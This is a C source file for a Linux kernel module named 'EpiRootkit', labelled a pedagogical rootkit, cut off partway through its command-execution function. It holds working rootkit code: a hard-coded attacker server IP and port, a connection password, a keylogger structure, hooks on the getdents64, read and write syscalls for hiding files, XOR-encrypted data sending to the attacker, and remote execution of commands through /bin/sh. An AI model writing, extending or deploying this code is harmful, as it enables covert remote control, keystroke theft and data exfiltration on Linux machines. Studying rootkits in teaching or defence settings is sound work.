// filepath: c:\Users\Admin\Documents\GitHub\epizut\rootkit\epirootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/ctype.h>
#include <linux/spinlock.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/namei.h>
#include <linux/inet.h> // For inet_addr (alternative to in_aton)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3"); // Incremented version

/* Configuration améliorée */
static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
    char temp_output_file[64];
    char hidden_dir[64];
    int max_hidden_lines;
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6", // Ensure this is the ATTACKER's IP
    .buffer_size = 2048, // Increased buffer size
    .xor_key = "epirootkit",
    .temp_output_file = "/tmp/.rk_out",
    .hidden_dir = "/.rk_hidden",
    .max_hidden_lines = 100
};

/* Structure simplifiée pour le keylogger */
struct keylogger {
    char *buffer;
    size_t size;
    size_t pos;
    spinlock_t lock;
    struct task_struct *thread;
    bool active;
};

/* Variables globales */
static struct socket *g_sock = NULL;
static struct task_struct *g_main_thread = NULL;
static struct keylogger g_keylog; // Keylogger functionality not fully implemented in this snippet
static bool g_authenticated = false;
static char g_password[32] = "epita";
static LIST_HEAD(g_hidden_lines); // For hiding lines in files (not fully implemented here)
static DEFINE_SPINLOCK(g_hidden_lines_lock);

/* Pointeurs originaux des syscalls */
// Ensure these types match the actual syscall signatures on your kernel version
typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
typedef asmlinkage long (*orig_read_t)(unsigned int, char __user *, size_t);
typedef asmlinkage long (*orig_write_t)(unsigned int, const char __user *, size_t);

static orig_getdents64_t orig_getdents64;
static orig_read_t orig_read;
static orig_write_t orig_write;

// Syscall table address - this needs to be found reliably
// For older kernels, it might be exported. For newer, kallsyms_lookup_name is needed.
// This is a placeholder; direct assignment might not work or be unsafe.
// For this example, we assume sys_call_table is a pre-resolved pointer.
extern void *sys_call_table[];


/* Fonction pour appliquer le chiffrement XOR */
static void xor_cipher(char *data, size_t len) {
    const size_t key_len = strlen(config.xor_key);
    size_t i;

    if (key_len == 0) return; // Avoid division by zero if key is empty
    for (i = 0; i < len; i++) {
        data[i] ^= config.xor_key[i % key_len];
    }
}

/* Fonction pour envoyer des données au serveur */
static int send_data(const char *data) {
    struct msghdr msg = {0};
    struct kvec vec;
    int ret;
    size_t data_len;
    char *encrypted_data = NULL;

    if (!g_sock) {
        printk(KERN_WARNING "EpiRootkit: send_data: No socket.\n");
        return -ENOTCONN;
    }
    if (!data) {
        printk(KERN_WARNING "EpiRootkit: send_data: NULL data.\n");
        return -EINVAL;
    }

    data_len = strlen(data);
    if (data_len == 0) {
        return 0; // Nothing to send
    }

    encrypted_data = kmalloc(data_len + 1, GFP_KERNEL); // +1 for null terminator if needed, though XOR doesn't expand
    if (!encrypted_data) {
        printk(KERN_ERR "EpiRootkit: send_data: kmalloc failed.\n");
        return -ENOMEM;
    }

    memcpy(encrypted_data, data, data_len);
    encrypted_data[data_len] = '\0'; // Ensure null termination before strlen if used by xor_cipher implicitly
    xor_cipher(encrypted_data, data_len);

    vec.iov_base = encrypted_data;
    vec.iov_len = data_len;

    // It's important that the socket is in a connected state.
    // kernel_sendmsg doesn't check for MSG_NOSIGNAL in flags, set in msg.msg_flags
    msg.msg_flags = MSG_NOSIGNAL; // Prevent SIGPIPE on client disconnect

    ret = kernel_sendmsg(g_sock, &msg, &vec, 1, data_len);
    kfree(encrypted_data);

    if (ret < 0) {
        printk(KERN_ERR "EpiRootkit: kernel_sendmsg error: %d\n", ret);
    }
    return ret;
}

/* Fonction pour exécuter une commande et renvoyer le résultat */
static void exec_command(const char *cmd) {
    char *argv[] = {"/bin/sh", "-c", NULL, NULL}; // Command will be third arg
    char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};
    int ret;
    struct file *outfile;
    char *output_buffer;
    mm_segment_t old_fs;
    loff_t offset = 0;

    if (!cmd || !*cmd) {